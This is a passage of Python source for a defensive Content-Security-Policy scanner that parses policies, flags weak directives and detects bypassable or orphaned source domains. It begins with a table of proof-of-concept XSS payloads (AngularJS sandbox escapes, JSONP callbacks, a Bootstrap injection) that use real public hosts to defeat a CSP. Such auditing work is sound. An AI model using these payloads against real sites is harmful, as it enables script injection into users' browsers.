    "www.st.com": {
        "risks": ["exec"],
        "pocs": [
            '<body ng-app ng-csp><script src="https://www.st.com/etc/clientlibs/st-search-cx/stangularjs.min.d9f5c8180af41b5cae710870b6b018fe.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:\'[].constructor.from([1],alert)\'"></body>'
        ],
    },
    "www.yastat.net": {
        "risks": ["exec"],
        "pocs": [
            '<script src="https://www.yastat.net/s3/milab/js/angular.min.js"></script><div ng-app><input autofocus ng-focus="window=$event.target.ownerDocument.defaultView;window.alert(window.origin);">'
        ],
    },
    "www.yastatic.net": {
        "risks": ["exec"],
        "pocs": [
            '<script src="https://www.yastatic.net/s3/milab/js/angular.min.js"></script><div ng-app><input autofocus ng-focus="window=$event.target.ownerDocument.defaultView;window.alert(window.origin);">'
        ],
    },
    "www.youtube.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://www.youtube.com/oembed?callback=alert(1)"></script>'],
    },
    "yandex.st": {
        "risks": ["exec"],
        "pocs": [
            '<script src="https://yandex.st/jquery/1.8.2/jquery.min.js"></script><script src="https://yandex.st/bootstrap/3.0.3/js/bootstrap.min.js"></script><button data-toggle="modal" data-target="$(\'head\').html(\'<script>alert(1)</script>\')">Test XSS</button>'
        ],
    },
    "yastat.net": {
        "risks": ["exec"],
        "pocs": [
            '<script src="https://yastat.net/s3/milab/js/angular.min.js"></script><div ng-app><input autofocus ng-focus="window=$event.target.ownerDocument.defaultView;window.alert(window.origin);">'
        ],
    },
    "yastatic.net": {
        "risks": ["exec"],
        "pocs": [
            '<script src="https://yastatic.net/s3/milab/js/angular.min.js"></script><div ng-app><input autofocus ng-focus="window=$event.target.ownerDocument.defaultView;window.alert(window.origin);">'
        ],
    },
    "yoast.com": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://yoast.com/wp-json?_jsonp=alert"></script>'],
    },
    "yuedust.yuedu.126.net": {
        "risks": ["exec"],
        "pocs": [
            '<body ng-app ng-csp><script src="//yuedust.yuedu.126.net/js/components/angular/angular.js"></script><div ng-app ng-csp><div ng-focus="x=$event;" id=f tabindex=0>foo</div><div ng-repeat="(key, value) in x.view"><div ng-if="key == \'window\'">{{ [1].reduce(value.alert, 1); }}</div></div></div></body>'
        ],
    },
    "yugiohmonstrosdeduelo.blogspot.com": {
        "risks": ["exec", "exfil"],
        "pocs": [
            '<script src="https://yugiohmonstrosdeduelo.blogspot.com/feeds/posts/summary?callback=alert"></script>'
        ],
    },
    "zhike.help.360.cn": {
        "risks": ["exec", "exfil"],
        "pocs": ['<script src="https://zhike.help.360.cn/api/v1/robotWindow?callback=alert(1)-"></script>'],
    },
}


def _index_bypass_domains() -> Dict[str, List[str]]:
    """Map every parent suffix of a bypass domain to the domains under it, so a
    wildcard source resolves with one lookup instead of a walk over the whole
    table."""
    index: Dict[str, List[str]] = {}
    for domain in BYPASS_DOMAINS:
        labels = domain.split(".")
        for cut in range(1, len(labels)):
            index.setdefault(".".join(labels[cut:]), []).append(domain)
    return index


BYPASS_DOMAINS_BY_SUFFIX: Dict[str, List[str]] = _index_bypass_domains()


DEFAULT_USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:144.0) Gecko/20100101 Firefox/144.0"

console = Console()

# ---------------------------------------
# Data structures
# ---------------------------------------


@dataclass
class SourceItem:
    raw: str
    normalized: str
    note: Optional[str] = None
    color: str = "white"
    is_bypass: bool = False
    is_orphan: bool = False
    orphan_status: Optional[str] = None
    is_internal: bool = False
    is_ineffective: bool = False
    wildcard_kind: Optional[str] = None
    host_status: Optional[str] = None
    resolved_addresses: List[str] = field(default_factory=list)
    is_missing_https: bool = False


@dataclass
class Policy:
    name: str
    policy_index: int = 0
    items: List[SourceItem] = field(default_factory=list)
    is_deprecated: bool = False
    is_unknown: bool = False
    is_ignored_duplicate: bool = False
    help_text: Optional[str] = None


@dataclass
class BypassFinding:
    directive: str
    source_raw: str
    bypass_domain: str
    risks: List[str]
    pocs: List[str]


@dataclass
class OrphanFinding:
    directive: str
    source_raw: str
    host: str
    fld: str
    status: str


@dataclass
class HostFinding:
    directive: str
    source_raw: str
    host: str
    status: str
    addresses: List[str]


@dataclass
class URLResult:
    url: str
    requested_url: str
    csp_raw: Optional[str]
    policies: List[Policy] = field(default_factory=list)
    deprecated_used: List[str] = field(default_factory=list)
    unknown_used: List[str] = field(default_factory=list)
    warnings: Dict[str, Any] = field(default_factory=dict)
    bypass_findings: List[BypassFinding] = field(default_factory=list)
    orphan_findings: List[OrphanFinding] = field(default_factory=list)
    host_findings: List[HostFinding] = field(default_factory=list)
    report_only: bool = False
    unreachable: bool = False
    legacy_header: bool = False
    reporting_endpoints_present: Optional[bool] = None
    error: Optional[str] = None


# ---------------------------------------
# Utilities
# ---------------------------------------


_SCHEME_RE = re.compile(r"^[a-zA-Z][a-zA-Z0-9+.-]*://")


def normalize_url(url: str) -> str:
    """Default a bare host to https. A URL that already names a scheme is left
    alone, so `ftp://x` fails with a clear protocol error instead of being
    silently turned into `https://ftp://x`."""
    if _SCHEME_RE.match(url):
        return url
    return "https:" + url if url.startswith("//") else "https://" + url


def normalize_lang(lang: Optional[str]) -> str:
    if not lang:
        return "en"
    lang = lang.strip().lower()
    if lang in {"de", "german", "deutsch"}:
        return "de"
    return "en"


def normalize_proxy_list(proxies: str) -> dict:
    """Map request scheme -> proxy URL. The keys are always ``http://`` and/or
    ``https://`` because httpx matches mounts against the scheme of the
    *request*, not the scheme of the proxy; a ``socks5://`` key would never
    match anything and the proxy would be silently ignored."""
    proxy_dict: Dict[str, str] = {}
    for p in proxies.split(","):
        p = p.strip()
        if not p:
            continue

        if "://" not in p:
            p = "http://" + p

        scheme = p.split("://", 1)[0].lower()
        if scheme in ("http", "https"):
            proxy_dict.setdefault(f"{scheme}://", p)
        else:
            # socks5, socks5h, ... proxy every request scheme.
            proxy_dict.setdefault("http://", p)
            proxy_dict.setdefault("https://", p)

    # A single http(s) proxy is used for both request schemes.
    if "http://" in proxy_dict and "https://" not in proxy_dict:
        proxy_dict["https://"] = proxy_dict["http://"]
    elif "https://" in proxy_dict and "http://" not in proxy_dict:
        proxy_dict["http://"] = proxy_dict["https://"]

    return proxy_dict


def build_proxy_mounts(proxy_dict: dict, *, verify: bool = True) -> Optional[dict]:
    """Convert scheme->url proxy dict to httpx mounts dict. ``verify`` has to be
    passed through: a mounted transport does not inherit the client's TLS
    settings, so --insecure would not apply to proxied requests."""
    if not proxy_dict:
        return None
    return {scheme: httpx.AsyncHTTPTransport(proxy=url, verify=verify) for scheme, url in proxy_dict.items()}


def read_urls_from_file(path: str) -> List[str]:
    """Read one URL per line, ignoring blanks and comments. Repeats are dropped:
    fetching the same host twice only duplicates its row in the report."""
    urls: List[str] = []
    seen: Set[str] = set()
    with open(path, "r", encoding="utf-8") as fh:
        for line in fh:
            url = line.strip()
            if not url or url.startswith("#") or url in seen:
                continue
            seen.add(url)
            urls.append(url)
    return urls


def parse_cookies(cookie_str: Optional[str]) -> Dict[str, str]:
    if not cookie_str:
        return {}
    jar: Dict[str, str] = {}
    for c in cookie_str.split(";"):
        c = c.strip()
        if not c:
            continue
        if "=" in c:
            k, v = c.split("=", 1)
            jar[k.strip()] = v.strip()
    return jar


def parse_headers(header_str: Optional[str]) -> Dict[str, str]:
    if not header_str:
        return {}
    hdrs: Dict[str, str] = {}
    for h in header_str.split(";"):
        h = h.strip()
        if not h:
            continue
        if ":" in h:
            k, v = h.split(":", 1)
            hdrs[k.strip()] = v.strip()
    return hdrs


def missing_directives(names: Set[str]) -> List[str]:
    """Directives whose absence leaves something unrestricted.

    Script execution is covered by `default-src` or `script-src`, or by
    `script-src-elem` and `script-src-attr` together: `script-src-elem` alone
    still leaves inline event handlers unrestricted."""
    missing = [d for d in NO_FALLBACK_DIRECTIVES if d not in names]
    script_covered = "default-src" in names or "script-src" in names or {"script-src-elem", "script-src-attr"} <= names
    if not script_covered:
        missing.append("script-src")
    return missing


def wildcard_kind(token: str) -> Optional[str]:
    """Classify the wildcard in a source token.

    "any" is a source that allows every origin, "partial" one that still pins a
    suffix or a port (`*.example.com`, `wss://*.example.com:*`). The two carry
    very different risk, so they are worth telling apart. A wildcard in the path
    (`https://example.com/*`) restricts nothing about the origin and is not a
    wildcard source at all."""
    host = token.strip()
    if host == "*":
        return "any"
    for scheme in ("https://", "http://", "wss://", "ws://", "//"):
        if host.lower().startswith(scheme):
            host = host[len(scheme) :]
            break
    host = host.split("/", 1)[0]
    if "*" not in host:
        return None
    return "any" if host == "*" else "partial"


def is_wildcard_token(token: str) -> bool:
    return wildcard_kind(token) is not None


def source_host(csp_source: str) -> str:
    """The bare host a source token names, without scheme, port or path."""
    src = csp_source.strip().lower()
    for scheme in ("https://", "http://", "wss://", "ws://", "//"):
        if src.startswith(scheme):
            src = src[len(scheme) :]
            break
    return src.split(":")[0].split("/")[0]


def source_permits_host(csp_source: str, host: str) -> bool:
    """Return True if the CSP source token would permit loading from `host`."""
    if not host or not csp_source:
        return False

    src = source_host(csp_source)
    host_lc = host.lower().strip()

    # Exact match
    if src == host_lc:
        return True

    # Wildcard subdomain: *.example.com allows sub.example.com
    if src.startswith("*."):
        suffix = src[1:]  # ".example.com"
        if host_lc.endswith(suffix):
            return True

    return False


def is_host(token: str) -> bool:
    """Return True for tokens that look like host/scheme sources."""
    t = token.strip()
    if not t:
        return False
    # Keyword, nonce and hash sources are always single-quoted; host sources
    # never are. Testing the quote covers every keyword, including ones added
    # to the spec later, instead of enumerating them.
    if t.startswith("'"):
        return False
    tl = t.lower()
    if tl.endswith(":"):
        return tl in {"http:", "https:"}
    if tl.startswith(("data:", "blob:", "filesystem:", "mediastream:", "ws:", "wss:")):
        return False
    if t == "*" or tl.startswith(("http://", "https://", "//")):
        return True
    if tl == "localhost":
        return True
    # IP literals; the dot/colon test keeps bare hex-looking words ("cafe")
    # from being read as addresses.
    if ("." in t or ":" in t) and re.match(r"^\[?[0-9a-fA-F:.]+\]?(:\d+)?(/.*)?$", t):
        return True
    if re.match(r"^[A-Za-z0-9*.-]+\.[A-Za-z]{2,}(:\d+)?(/.*)?$", t):
        return True
    return False


def extract_csp_from_html_head(html: str) -> Optional[str]:
    class _MetaCSPParser(HTMLParser):
        def __init__(self):
            super().__init__()
            self.csp = None
            self._in_head = False

        def handle_starttag(self, tag, attrs):
            tag_l = tag.lower()
            if tag_l == "head":
                self._in_head = True

            if not self._in_head:
                return

            if tag_l == "meta":
                attrs_dict = {k.lower(): v for k, v in attrs}
                http_equiv = (attrs_dict.get("http-equiv") or "").lower()
                if http_equiv in ("content-security-policy", "x-content-security-policy"):
                    content = attrs_dict.get("content")
                    if content and self.csp is None:
                        self.csp = content.strip()

            if tag_l == "body":
                self._in_head = False

        def handle_endtag(self, tag):
            if tag.lower() == "head":
                self._in_head = False

    parser = _MetaCSPParser()
    try:
        parser.feed(html or "")
    except Exception:
        pass
    return parser.csp


def split_policies(csp_header: str) -> List[List[str]]:
    """Split a CSP header value into policies and their directives.

    A single header may carry several policies separated by commas (and httpx
    joins repeated headers the same way); every one of them is enforced. Only
    splitting on ``;`` would glue the last directive of one policy to the first
    of the next and mangle both."""
    return [[d.strip() for d in pol.split(";") if d.strip()] for pol in csp_header.split(",")]


_LATEX_SPECIALS = {
    "\\": r"\textbackslash{}",
    "&": r"\&",
    "%": r"\%",
    "$": r"\$",
    "#": r"\#",
    "_": r"\_",
    "{": r"\{",
    "}": r"\}",
    "~": r"\textasciitilde{}",
    "^": r"\textasciicircum{}",
}


def latex_escape(text: str) -> str:
    """Escape the characters that would break a LaTeX run. URLs from the command
    line and host names from a CSP routinely contain ``&``, ``%``, ``#`` and
    ``_``, all of which are active characters."""
    return "".join(_LATEX_SPECIALS.get(c, c) for c in text)


def has_effective_csp(res: URLResult) -> bool:
    """False when the result carries no policy a browser would enforce. A policy
    delivered only through X-Content-Security-Policy counts as none: the prefix
    was an IE10/old-Firefox extension and is ignored today."""
    return bool(res.csp_raw) and not res.error and not res.legacy_header


def pretty_csp(csp_raw: Optional[str]) -> str:
    if not csp_raw:
        return ""
    directives = [d for pol in split_policies(csp_raw) for d in pol]
    if not directives:
        return ""
    return ";\n".join(directives) + ";"


def highlight_csp_problems(csp_pretty: str, res: URLResult) -> str:
    """
    Surround problematic source tokens in the pretty-printed CSP with
    §R[...]R§ markers for LaTeX highlighting.

    Decisions are made per whole token (never via substring replacement) so
    that markers cannot nest and a token is never matched inside a longer one
    (e.g. ``crazygames.com`` inside ``crazygames.com.br``).
    """
    wrap_exact = set()
    if res.warnings.get("unsafe_inline"):
        wrap_exact.add("'unsafe-inline'")
    if res.warnings.get("unsafe_eval"):
        wrap_exact.add("'unsafe-eval'")
    if res.warnings.get("data_or_blob"):
        wrap_exact.update({"data:", "blob:"})

    flag_http = bool(res.warnings.get("missing_https_and_upgrade"))
    flag_wildcard = bool(res.warnings.get("wildcard_sources"))

    def needs_wrap(bare: str) -> bool:
        if not bare:
            return False
        if bare in wrap_exact:
            return True
        if flag_wildcard and "*" in bare:
            return True
        if flag_http and (bare.startswith("http://") or is_host(bare)):
            return True
        return False

    out_lines: List[str] = []
    for line in csp_pretty.split("\n"):
        tokens = line.split()
        new_tokens: List[str] = []
        for idx, tok in enumerate(tokens):
            # The first token of a directive line is the directive name, never
            # a source value — leave it untouched.
            if idx == 0:
                new_tokens.append(tok)
                continue
            # Peel a trailing ';' directive terminator off before matching so
            # it stays outside the marker.
            bare, suffix = (tok[:-1], ";") if tok.endswith(";") else (tok, "")
            if needs_wrap(bare):
                new_tokens.append(f"§R[{bare}]R§{suffix}")
            else:
                new_tokens.append(tok)
        out_lines.append(" ".join(new_tokens))

    return "\n".join(out_lines)


def _build_source_item(item: str) -> SourceItem:
    """Turn one source token into a SourceItem. Keywords and scheme sources are
    case-insensitive; only the payload of a nonce or hash is not, and that is
    collapsed into the prefix anyway. Host sources keep their spelling so the
    output shows what the policy actually says."""
    lower_item = item.lower()
    if lower_item.startswith(("'nonce-", "'sha256-", "'sha384-", "'sha512-")):
        norm = lower_item.split("-", 1)[0] + "-'"
    elif item.startswith("'") or (lower_item.endswith(":") and "//" not in lower_item):
        norm = lower_item
    else:
        norm = item

    wild = wildcard_kind(item)
    if wild:
        color = "dark_orange"
    elif norm in {"'unsafe-inline'", "'unsafe-eval'"}:
        color = "red"
    elif norm in {"data:", "blob:"}:
        color = "yellow"
    elif norm in {"'none'", "'self'"}:
        color = "blue"
    else:
        color = "white"

    return SourceItem(
        raw=item,
        normalized=norm,
        note=T_HELP.get(norm, {}).get("text"),
        color=color,
        wildcard_kind=wild,
    )


def _parse_policies(policy_sets: List[List[str]]) -> List[Policy]:
    """Build the Policy objects for every policy in the header.

    Within one policy the browser applies the first occurrence of a directive
    and ignores the rest, so later ones are kept for display but marked, and
    nothing downstream counts them."""
    policies: List[Policy] = []
    for index, directives in enumerate(policy_sets):
        seen: Set[str] = set()
        for directive in directives:
            tokens = [t for t in directive.split() if t]
            if not tokens:
                continue
            # Directive names are ASCII case-insensitive.
            name = tokens[0].lower()
            policies.append(
                Policy(
                    name=name,
                    policy_index=index,
                    items=[_build_source_item(v) for v in tokens[1:]],
                    is_deprecated=name in DEPRECATED_OR_LEGACY,
                    # A misspelled directive is silently ignored by the browser,
                    # so the restriction it was meant to express does not apply.
                    is_unknown=name not in KNOWN_DIRECTIVES,
                    is_ignored_duplicate=name in seen,
                    help_text=T_HELP.get(name, {}).get("text"),
                )
            )
            seen.add(name)
    return policies


def _governing_items(policy_map: Dict[str, List[SourceItem]], name: str) -> Optional[List[SourceItem]]:
    """The sources one policy applies to `name`, or None when that policy places
    no restriction on it at all."""
    chain = (name, *FALLBACK_CHAIN.get(name, ()))
    if name in FETCH_DIRECTIVES:
        chain += ("default-src",)
    for candidate in chain:
        if candidate in policy_map:
            return policy_map[candidate]
    return None


def _permits(items: List[SourceItem], item: SourceItem) -> bool:
    """Does this source list allow what `item` allows?

    Exact for keyword and scheme sources. For host sources it errs towards yes,
    because keeping a finding that needs a second look beats dropping a real
    one."""
    normalized = {i.normalized for i in items}
    if item.raw.lower() in {i.raw.lower() for i in items}:
        return True

    # An inline script carrying a nonce or hash is allowed just as well by a
    # policy that allows every inline script.
    if item.normalized in NONCE_AND_HASH_SOURCES:
        return "'unsafe-inline'" in normalized

    # Capability keywords have to be granted by name in every policy. 'self' is
    # the exception: it resolves to the document's own origin, so a scheme-wide
    # source covers it like any other host.
    if item.normalized.startswith("'") and item.normalized != "'self'":
        return item.normalized in normalized

    # `*` and the scheme sources match hosts of any origin, but not data: or
    # blob:, which have to be named explicitly.
    if item.normalized in {"data:", "blob:", "filesystem:"}:
        return False
    if normalized & {"*", "https:", "http:"}:
        return True

    host = extract_host_from_source(item.raw)
    if not host:
        return False
    return any(source_permits_host(i.raw, host) for i in items)


def mark_ineffective_sources(policies: List[Policy]) -> None:
    """Flag every source another policy in the same header blocks.

    A header can carry several policies, and a browser enforces all of them, so
    only what every policy permits has any effect. A policy that does not
    mention a resource type at all restricts nothing about it."""
    by_index: Dict[int, Dict[str, List[SourceItem]]] = {}
    for policy in policies:
        by_index.setdefault(policy.policy_index, {})[policy.name] = policy.items
    if len(by_index) < 2:
        return

    for policy in policies:
        others = [m for index, m in by_index.items() if index != policy.policy_index]
        for item in policy.items:
            # These grant no origin of their own, so no other policy can take
            # anything away from them.
            if item.normalized in NON_GRANTING_KEYWORDS:
                continue
            governing = (_governing_items(other, policy.name) for other in others)
            item.is_ineffective = any(g is not None and not _permits(g, item) for g in governing)


def matching_bypass_domains(csp_source: str) -> List[str]:
    """The known bypass domains a source token permits."""
    src = source_host(csp_source)
    if src.startswith("*."):
        return BYPASS_DOMAINS_BY_SUFFIX.get(src[2:], [])
    return [src] if src in BYPASS_DOMAINS else []


def _scan_bypasses(policies: List[Policy]) -> List[BypassFinding]:
    """Mark every source that names a domain known to defeat a CSP."""
    findings: List[BypassFinding] = []
    seen: Set[tuple] = set()
    for policy in policies:
        for item in policy.items:
            if item.is_ineffective:
                continue
            for bypass_domain in matching_bypass_domains(item.normalized):
                meta = BYPASS_DOMAINS[bypass_domain]
                item.is_bypass = True
                item.color = "bright_red"
                key = (policy.name, item.raw, bypass_domain)
                if key in seen:
                    continue
                seen.add(key)
                findings.append(
                    BypassFinding(
                        directive=policy.name,
                        source_raw=item.raw,
                        bypass_domain=bypass_domain,
                        risks=meta["risks"],
                        pocs=meta["pocs"],
                    )
                )
    return findings


def _analyse_policies(policies: List[Policy]) -> Dict[str, Any]:
    """Derive the warning flags from the policies the browser actually applies."""
    names = {p.name for p in policies}
    catchall_script_sources: List[str] = []

    has_unsafe_inline = False
    has_unsafe_eval = False
    has_wildcard_any = False
    has_wildcard_partial = False
    has_data_or_blob = False
    saw_host_source = False
    has_explicit_https_source = False

    for policy in policies:
        for item in policy.items:
            if item.is_ineffective:
                continue
            lower_raw = item.raw.lower()
            if is_host(item.raw):
                saw_host_source = True
            if item.normalized == "'unsafe-inline'":
                has_unsafe_inline = True
            if item.normalized == "'unsafe-eval'":
                has_unsafe_eval = True
            if item.wildcard_kind == "any":
                has_wildcard_any = True
            elif item.wildcard_kind == "partial":
                has_wildcard_partial = True
            if item.normalized in {"data:", "blob:"}:
                has_data_or_blob = True
            if item.normalized == "https:" or lower_raw.startswith(("https://", "wss://")):
                has_explicit_https_source = True
            # A source that matches every host permits every known bypass domain
            # too, but matches none of them literally, so the scan misses it.
            if policy.name in SCRIPT_CAPABLE_DIRECTIVES and (
                item.wildcard_kind == "any" or item.normalized in {"https:", "http:"}
            ):
                catchall_script_sources.append(f"{policy.name} {item.raw}")

    return {
        "missing_directives": missing_directives(names),
        "deprecated_directives": sorted(names & DEPRECATED_OR_LEGACY),
        "unknown_directives": sorted(names - KNOWN_DIRECTIVES),
        "unsafe_inline": has_unsafe_inline,
        "unsafe_eval": has_unsafe_eval,
        # Kept as the combined flag the LaTeX all-origins option is built on.
        "wildcard_sources": has_wildcard_any or has_wildcard_partial,
        "wildcard_any_origin": has_wildcard_any,
        "wildcard_partial": has_wildcard_partial,
        "data_or_blob": has_data_or_blob,
        # report-uri is deprecated but still honoured by every current browser,
        # so a policy that has one is not without any reporting at all.
        "missing_report_to": not (names & {"report-to", "report-uri"}),
        "legacy_reporting_only": "report-uri" in names and "report-to" not in names,
        "missing_https_and_upgrade": (
            saw_host_source and not has_explicit_https_source and "upgrade-insecure-requests" not in names
        ),
        "bypass_via_catchall": catchall_script_sources,
    }


def parse_csp(
    csp_header: Optional[str],
    url: str,
    requested_url: str,
) -> URLResult:
    if not csp_header:
        return URLResult(
            url=url, requested_url=requested_url, csp_raw=None, error="Content-Security-Policy header not found"
        )

    policies = _parse_policies(split_policies(csp_header))
    applied = [p for p in policies if not p.is_ignored_duplicate]
    mark_ineffective_sources(applied)

    warnings_dict = _analyse_policies(applied)
    bypass_findings = _scan_bypasses(applied)
    warnings_dict["bypass_domains"] = bool(bypass_findings)
    duplicates = sorted({p.name for p in policies if p.is_ignored_duplicate})
    if duplicates:
        warnings_dict["duplicate_directives"] = duplicates
    policy_count = len({p.policy_index for p in policies})
    if policy_count > 1:
        warnings_dict["multiple_policies"] = policy_count

    # When the policy relies on http-capable host sources without pinning https
    # (and without upgrade-insecure-requests), flag each affected plain host so
    # the renderers can mark it. Wildcards already carry their own flag.
    if warnings_dict["missing_https_and_upgrade"]:
        for policy in applied:
            for item in policy.items:
                if not item.is_ineffective and is_host(item.raw) and not item.wildcard_kind:
                    item.is_missing_https = True

    return URLResult(
        url=url,
        requested_url=requested_url,
        csp_raw=csp_header,
        policies=policies,
        deprecated_used=warnings_dict["deprecated_directives"],
        unknown_used=warnings_dict["unknown_directives"],
        warnings=warnings_dict,
        bypass_findings=bypass_findings,
        error=None,
    )


# ---------------------------------------
# Orphan / dangling domain detection
# ---------------------------------------


class DomainStatus(str, Enum):
    EXISTS = "exists"
    NXDOMAIN = "nxdomain"
    NOTREGISTERED = "notregistered"
    NOANSWER = "noanswer"
    NONS = "nonameservers"
    OTHER = "other"
    UNKNOWN = "unknown"


ORPHAN_STATUSES = (DomainStatus.NXDOMAIN, DomainStatus.NOTREGISTERED, DomainStatus.NONS)

# WHOIS servers are slower and flakier than DNS, and the lookup only runs for
# domains DNS already found suspicious.
WHOIS_TIMEOUT = 10

_HOST_QUOTE_RE = re.compile(r"^'+|'+$")


def extract_host_from_source(item: str) -> Optional[str]:
    """Extract a bare hostname from a CSP source token, or None for keywords,
    schemes, nonces, hashes and other non-host expressions."""
    if not item:
        return None
    stripped = item.strip()
    # Keyword, nonce and hash sources are always single-quoted; host sources
    # never are. Testing the quotes covers every keyword, including ones added
    # to the spec later, instead of enumerating them.
    if stripped.startswith("'"):
        return None
    raw = _HOST_QUOTE_RE.sub("", stripped)
    raw_low = raw.lower()

    # Tolerate policies that write keywords without the required quotes.
    if raw_low in {"*", "self", "none", "unsafe-inline", "unsafe-eval", "strict-dynamic", "report-sample"}:
        return None
    if raw_low.endswith(":"):
        return None
    if raw_low.startswith(("data:", "blob:", "filesystem:", "mediastream:", "ws:", "wss:")):
        return None
    if raw_low.startswith(("nonce-", "sha256-", "sha384-", "sha512-")):
        return None

    if raw.startswith("*."):
        raw = raw[2:]
    if "://" in raw:
        raw = raw.split("://", 1)[1]
    host = raw.split("/", 1)[0]
    host = host.split("@")[-1]
    if host.startswith("["):
        # Bracketed IPv6 literal: the address itself is full of colons, so the
        # port can only be split off after the closing bracket.
        addr, _, _ = host[1:].partition("]")
        host = addr
    else:
        host = host.split(":", 1)[0]
    return host.lower() if host else None


def to_fld(host: str) -> Optional[str]:
    """Return the registrable (first-level) domain for a host, or None when the
    host has no public suffix (IPs, localhost, intranet names)."""
    if not host:
        return None
    te = tldextract.extract(host)
    if not te.domain or not te.suffix:
        return None
    return f"{te.domain}.{te.suffix}"


def _resolve_domain_status_sync(
    domain: str, dns_resolvers: Optional[List[str]] = None, dns_timeout: float = 3.0
) -> DomainStatus:
    if not domain:
        return DomainStatus.UNKNOWN

    if not HAVE_DNSPY:
        try:
            socket.getaddrinfo(domain, 80)
            return DomainStatus.EXISTS
        except socket.gaierror:
            return DomainStatus.NXDOMAIN
        except Exception:
            return DomainStatus.OTHER

    try:
        r = _dns_resolver.Resolver(configure=not dns_resolvers)
    except Exception:
        return DomainStatus.UNKNOWN
    if dns_resolvers:
        r.nameservers = list(dns_resolvers)
    r.lifetime = dns_timeout
    r.timeout = dns_timeout

    def _lookup() -> DomainStatus:
        for rtype in ("A", "AAAA"):
            try:
                r.resolve(domain, rtype)
                return DomainStatus.EXISTS
            except NXDOMAIN:
                return DomainStatus.NXDOMAIN
            except NoNameservers:
                return DomainStatus.NONS
            except NoAnswer:
                continue
            except Exception:
                continue
        return DomainStatus.NOANSWER

    status = _lookup()

    # DNS alone cannot tell an unregistered domain from a registered one whose
    # zone is broken, and only the former is claimable. WHOIS settles it.
    if status in (DomainStatus.NXDOMAIN, DomainStatus.NONS) and HAVE_WHOIS:
        try:
            _whois_lookup(domain, timeout=WHOIS_TIMEOUT, quiet=True)
        except WhoisDomainNotFoundError:
            status = DomainStatus.NOTREGISTERED
        except Exception:
            # Any other WHOIS failure says nothing about the registration, so
            # the DNS verdict stands.
            pass

    return status


async def build_domain_health_map(
    domains: Set[str], dns_resolvers: Optional[List[str]] = None, concurrency: int = 50, dns_timeout: float = 3.0
) -> Dict[str, DomainStatus]:
    results: Dict[str, DomainStatus] = {}
    if not domains:
        return results
    loop = asyncio.get_running_loop()
    sem = asyncio.Semaphore(concurrency)
    with concurrent.futures.ThreadPoolExecutor(max_workers=concurrency) as pool:

        async def task(d: str):
            async with sem:
                func = partial(_resolve_domain_status_sync, d, dns_resolvers, dns_timeout)
                results[d] = await loop.run_in_executor(pool, func)

        await asyncio.gather(*(task(d) for d in domains))
    return results


async def annotate_orphans(
    results: List[URLResult],
    *,
    dns_resolvers: Optional[List[str]] = None,
    concurrency: int = 50,
    dns_timeout: float = 3.0,
) -> None:
    """Resolve every registrable domain referenced across all results once, then
    mark the source items whose domain is orphaned (claimable) in place."""
    flds: Set[str] = set()
    for res in results:
        if res.error or not res.csp_raw:
            continue
        for p in res.policies:
            for it in p.items:
                host = extract_host_from_source(it.raw)
                fld = to_fld(host) if host else None
                if fld:
                    flds.add(fld)

    if not flds:
        return

    health = await build_domain_health_map(
        flds, dns_resolvers=dns_resolvers, concurrency=concurrency, dns_timeout=dns_timeout
    )
    orphan_flds = {f for f, s in health.items() if s in ORPHAN_STATUSES}
    if not orphan_flds:
        return

    for res in results:
        if res.error or not res.csp_raw:
            continue
        seen: Set = set()
        for p in res.policies:
            for it in p.items:
                host = extract_host_from_source(it.raw)
                if not host:
                    continue
                fld = to_fld(host)
                if not fld or fld not in orphan_flds:
                    continue
                status = health[fld].value
                it.is_orphan = True
                it.orphan_status = status
                key = (p.name, it.raw, fld)
                if key not in seen:
                    seen.add(key)
                    res.orphan_findings.append(
                        OrphanFinding(directive=p.name, source_raw=it.raw, host=host, fld=fld, status=status)
                    )
        if res.orphan_findings:
            res.warnings["orphan_domains"] = True


# ---------------------------------------
# Internal / non-public host detection
# ---------------------------------------


class HostStatus(str, Enum):
    PUBLIC = "public"
    PRIVATE_IP = "private-ip"
    NONPUBLIC_TLD = "nonpublic-tld"
    NO_PUBLIC_RECORD = "no-public-record"
    UNRESOLVED = "unresolved"


INTERNAL_HOST_STATUSES = (HostStatus.PRIVATE_IP, HostStatus.NONPUBLIC_TLD, HostStatus.NO_PUBLIC_RECORD)
INTERNAL_HOST_STATUS_VALUES = {s.value for s in INTERNAL_HOST_STATUSES}

# Suffixes that are listed in the Public Suffix List but are reserved for
# private/internal use, so tldextract alone would call them public.
PRIVATE_USE_SUFFIXES = {"home.arpa", "localhost"}

HOST_STATUS_HELP: Dict[HostStatus, str] = {
    HostStatus.PRIVATE_IP: "resolves to a non-routable address",
    HostStatus.NONPUBLIC_TLD: "no public suffix (internal-only name)",
    HostStatus.NO_PUBLIC_RECORD: "no public A/AAAA record",
    HostStatus.UNRESOLVED: "no resolver answered",
}


def _classify_addresses(addresses: List[str]) -> HostStatus:
    """PRIVATE_IP when every resolved address is non-routable (RFC1918, loopback,
    link-local, CGNAT, IPv6 ULA), PUBLIC otherwise."""
    if not addresses:
        return HostStatus.UNRESOLVED
    # getaddrinfo appends a scope id to link-local IPv6 ("fe80::1%eth0"), which
    # ip_address() rejects.
    if all(not ipaddress.ip_address(a.partition("%")[0]).is_global for a in addresses):
        return HostStatus.PRIVATE_IP
    return HostStatus.PUBLIC


def _resolve_host_sync(
    host: str, dns_resolvers: Optional[List[str]] = None, dns_timeout: float = 3.0, is_wildcard: bool = False
) -> tuple[HostStatus, List[str]]:
    """Classify a single CSP host. Literal addresses and names without a public
    suffix are decided offline; everything else is looked up via the given
    resolvers, which are tried in order and only advanced past on a transient
    failure."""
    if not host:
        return HostStatus.UNRESOLVED, []

    try:
        ip = ipaddress.ip_address(host)
    except ValueError:
        pass
    else:
        return (HostStatus.PUBLIC if ip.is_global else HostStatus.PRIVATE_IP), [str(ip)]

    te = tldextract.extract(host)
    if not te.suffix or te.suffix in PRIVATE_USE_SUFFIXES:
        return HostStatus.NONPUBLIC_TLD, []

    # A wildcard source has no resolvable name of its own; the apex frequently
    # carries no A/AAAA record, which would be a false positive.
    if is_wildcard:
        return HostStatus.PUBLIC, []

    if not HAVE_DNSPY:
        try:
            infos = socket.getaddrinfo(host, None)
        except socket.gaierror:
            return HostStatus.NO_PUBLIC_RECORD, []
        except Exception:
            return HostStatus.UNRESOLVED, []
        found = sorted({str(info[4][0]) for info in infos})
        return _classify_addresses(found), found

    nameservers: List[Optional[str]] = list(dns_resolvers) if dns_resolvers else [None]
